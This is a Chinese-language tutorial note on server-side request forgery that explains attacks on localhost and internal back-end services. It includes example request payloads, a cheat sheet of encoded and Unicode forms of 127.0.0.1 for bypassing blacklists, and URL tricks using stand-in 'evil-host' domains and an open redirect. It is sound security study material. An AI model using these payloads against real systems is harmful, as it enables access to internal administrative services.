# Server-side request forgery (SSRF)
* 服務器端請求偽造 (SSRF)，是指攻擊者使服務器端應用程序向非預期位置發出請求。
* 可能會導致服務器與僅限組織內部之服務建立連接。 
* 可能會強制服務器連接到任意外部系統。
## 案例
### Against the server itself
* 攻擊者使服務器本身向自己發起請求，像是請求 `localhost` 、 `127.0.0.1`。
* 如果成功存取，可以進一步存取其他敏感資訊。
* 這邊我們透過 API 請求 `localhost/admin` 來取得服務器本地端的應用程式。
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```
* 應用程式會以這種方式運行，並且信任來自本地端的請求，原因包含:
    *  access control 可能只有針對從向服務器發起的請求做檢查，而不會檢查服務本身發起的請求。
    *  出於災害復原的目的，應用程式可能允許來自本地的任何用戶在不登錄的情況下進行管理訪問，以方便管理者可以直接進行復原。
    *  管理界面可能正在監聽與主應用程式不同的端口號，因此無法直接使用用戶方式訪問。
### Against other back-end systems
* 攻擊者可以透過服務器向其他服務器進行請求，進一步取得敏感資訊或是其他攻擊。
* 原因是內網中的其他服務器，可能過度信任內網中服務器的請求，而未進行內網中的服務器請求驗證。
* 這邊我們透過 API 請求 `http://192.168.0.68/admin` 來取得其他服務器的應用程式。
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```
### Circumventing common SSRF defenses
#### Blacklist-based input filters
* 應用程式可能設定 `127.0.0.1` 、 `localhost` 為黑名單，但我們可以透過下面 cheatsheet 來繞過檢查。
* [w181496/Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet#ssrf)
* [0xn3va/ssrf](https://0xn3va.gitbook.io/cheat-sheets/web-application/server-side-request-forgery)
```
127.0.0.1
127.00000.00000.0001
localhost
127.0.1
127.1
0.0.0.0
0.0
0

::1
::127.0.0.1
::ffff:127.0.0.1
::1%1

127.12.34.56 (127.0.0.1/8)
127.0.0.1.xip.io

http://2130706433 (decimal)
http://0x7f000001
http://017700000001
http://0x7f.0x0.0x0.0x1
http://0177.0.0.1
http://0177.01.01.01
http://0x7f.1
http://[::]
```
```
127。0。0。1
127｡0｡0｡1
127．0．0．1
⑫７｡⓪．𝟢。𝟷
𝟘𝖃𝟕𝒇｡𝟘𝔵𝟢｡𝟢𝙭⓪｡𝟘𝙓¹
⁰𝔁𝟳𝙛𝟢０１
２𝟏𝟑𝟢𝟕𝟢６𝟺𝟛𝟑
𝟥𝟪³。𝟚⁵𝟞。²₅𝟞。²𝟧𝟟
𝟢₁𝟳₇｡０｡０｡𝟢𝟷
𝟎𝟢𝟙⑦⁷。０００。𝟶𝟬𝟢𝟘。𝟎₀𝟎𝟢０𝟣
[::𝟏②₇．𝟘．₀．𝟷]
[::𝟭２𝟟｡⓪｡₀｡𝟣%𝟸𝟭⑤]
[::𝚏𝕱ᶠ𝕗:𝟏₂７｡₀｡𝟢｡①]
[::𝒇ℱ𝔣𝐹:𝟣𝟤７。₀。０。₁%②¹𝟧]
𝟎𝚇𝟕𝖋｡⓪｡𝟣
𝟎ˣ𝟩𝘍｡𝟷
𝟘𝟘①𝟕⑦．１
⓪𝟘𝟙𝟳𝟽｡𝟎𝓧₀｡𝟏
```
#### whitelist-based input filters
* 應用程式只允許匹配、以或包含允許值的白名單的輸入。在這種情況下，有時可以通過利用 URL 解析中的不一致來繞過。
* 透過 `@`。
```
https://expected-host@evil-host
```
* 透過 `#`。
```
https://evil-host#expected-host
```
* 透過 DNS 命名層次結構。
```
https://expected-host.evil-host
```
* URL-encode。
#### Bypassing via open redirection
* 有時候 API 可能提供開放重新導向路徑，我們可以藉此來繞過檢查。
```
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```
### Blind SSRF vulnerabilities
* Blind SSRF 是指可以使用應用程式發出後端 HTTP 請求，但請求的回應不會出現在前端。
* 可以透過 out-of-band techniques (OAST) 方法，來確認是否存在 Blind SSRF。
---
###### tags: `web security`